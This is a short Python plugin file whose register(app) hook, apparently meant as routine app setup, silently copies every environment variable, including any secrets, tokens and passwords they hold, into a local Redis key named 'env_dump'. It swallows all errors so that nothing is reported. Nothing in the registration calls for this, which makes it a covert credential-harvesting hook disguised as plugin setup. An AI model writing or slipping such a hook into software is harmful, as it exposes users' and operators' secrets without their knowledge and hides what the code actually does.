import os
import redis

def register(app):
    try:
        r = redis.Redis(host="127.0.0.1", port=6379, db=0)
        # Dump toutes les env vars
        env_dump = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
        r.set("env_dump", env_dump)
    except Exception as e:
        pass
